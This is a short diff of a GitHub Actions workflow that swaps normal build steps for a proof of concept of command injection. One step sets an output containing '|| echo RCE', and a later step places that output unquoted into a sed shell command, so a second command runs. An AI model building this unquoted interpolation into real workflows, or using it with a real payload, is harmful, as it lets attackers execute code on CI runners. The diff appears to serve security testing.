@@ -8,11 +8,11 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
+      - id: step-1
+        run: |
+          {
+            echo "variable=|| echo RCE"
+          } >> "$GITHUB_OUTPUT"
 
-      - name: Upload build artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: build-output
-          path: test2.file
+      - run: |
+          sed -i 's+/home/runner/work/feeds-manager/feeds-manager/+/github/workspace/+g' ${{ steps.step-1.outputs.variable }}
